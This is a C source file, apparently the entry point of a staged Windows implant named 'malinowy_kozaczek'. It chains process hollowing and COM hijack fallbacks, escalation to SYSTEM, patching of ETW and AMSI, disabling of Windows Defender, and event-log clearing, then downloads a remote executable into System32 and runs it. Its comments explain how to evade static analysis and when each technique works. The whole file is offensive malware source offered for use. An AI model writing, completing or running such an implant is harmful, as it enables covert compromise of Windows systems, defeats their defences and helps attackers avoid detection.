/*
 * malinowy_kozaczek — Stage-based Windows implant
 *
 * Architecture: modular 4-stage pipeline
 *   Stage 1: Process hijack via transacted hollowing
 *   Stage 2: UAC bypass + token escalation to SYSTEM
 *   Stage 3: ETW/AMSI patch + Defender removal
 *   Stage 4: Remote payload fetch & execution
 *
 * Design decisions:
 *   — All NTAPI functions resolved at runtime via GetProcAddress(ntdll)
 *     to avoid static import tables that scream "malware" on static analysis.
 *   — Stages are sequential with fallback: if stage N fails, stage N-1
 *     retries with a different technique before giving up.
 *   — Minimal C runtime dependency — /GS- and no CRT startup when
 *     compiled with MSVC /ENTRY. MinGW uses its own crt which is fine.
 *
 * Gotchas:
 *   — SeDebugPrivilege is required for process hollowing. If running as
 *     user without it, must escalate FIRST or use COM hijack as fallback.
 *   — Transacted hollowing requires TxF which is deprecated in Win10 20H1+
 *     but still functional on most Win11 builds (check build number).
 *   — AMSI patching must be done per-process; every new process needs
 *     its own patch.
 */

#include <windows.h>
#include <stdio.h>

#include "utils.h"
#include "hollow.h"
#include "escalate.h"
#include "evade.h"
#include "payload.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow)
{
    /*
     * Orchestrator — run the full pipeline.
     * Each stage returns 0 on success, nonzero on failure.
     * On failure we try the next fallback technique before aborting.
     */

    HANDLE hTargetProcess = NULL;
    DWORD  dwTargetPid    = 0;
    int    result         = 0;

    /* ── Stage 1: Hijack a trusted system process ── */
    DEBUG_PRINT("[Stage 1] Starting process hijack...\n");

    /* Try transacted hollowing first (stealthiest) */
    result = hollow_transacted_hijack(&hTargetProcess, &dwTargetPid);

    if (result != 0)
    {
        /* Fallback: classic process hollowing */
        DEBUG_PRINT("[Stage 1] Transacted hollowing failed (0x%x), trying classic hollowing...\n", result);
        result = hollow_classic_hijack(&hTargetProcess, &dwTargetPid);
    }

    if (result != 0)
    {
        /* Fallback: COM hijack — no process handle needed, runs in-proc */
        DEBUG_PRINT("[Stage 1] Classic hollowing failed, trying COM hijack...\n");
        result = hollow_com_hijack();
    }

    if (result != 0)
    {
        DEBUG_PRINT("[FATAL] Stage 1 failed — all hijack techniques exhausted.\n");
        return 1;
    }
    DEBUG_PRINT("[Stage 1] Hijack successful (PID: %lu)\n", dwTargetPid);

    /* ── Stage 2: Escalate to SYSTEM ── */
    DEBUG_PRINT("[Stage 2] Starting privilege escalation...\n");

    result = escalate_to_system();

    if (result != 0)
    {
        /* Fallback: named pipe impersonation */
        DEBUG_PRINT("[Stage 2] Direct escalation failed, trying named pipe impersonation...\n");
        result = escalate_named_pipe();
    }

    if (result != 0)
    {
        DEBUG_PRINT("[WARN] Stage 2 escalation failed — continuing as admin\n");
        /* Continue anyway; we may already have some privileges */
    }
    else
    {
        DEBUG_PRINT("[Stage 2] Escalation successful — running as SYSTEM\n");
    }

    /* ── Stage 3: Defense evasion ── */
    DEBUG_PRINT("[Stage 3] Patching ETW...\n");
    evade_patch_etw();

    DEBUG_PRINT("[Stage 3] Patching AMSI...\n");
    evade_patch_amsi();

    DEBUG_PRINT("[Stage 3] Disabling Windows Defender...\n");
    evade_disable_defender();

    DEBUG_PRINT("[Stage 3] Clearing event logs...\n");
    evade_clear_logs();

    /* ── Stage 4: Remote payload ── */
    DEBUG_PRINT("[Stage 4] Fetching and executing remote payload...\n");

    result = payload_fetch_and_exec(
        "https://example.com/xyz.exe",   /* TODO: replace with real URL */
        "xyz.exe",
        PAYLOAD_DROP_SYSTEM32
    );

    if (result != 0)
    {
        DEBUG_PRINT("[Stage 4] Payload fetch failed (0x%x)\n", result);
    }

    DEBUG_PRINT("[+] Pipeline complete.\n");
    return 0;
}
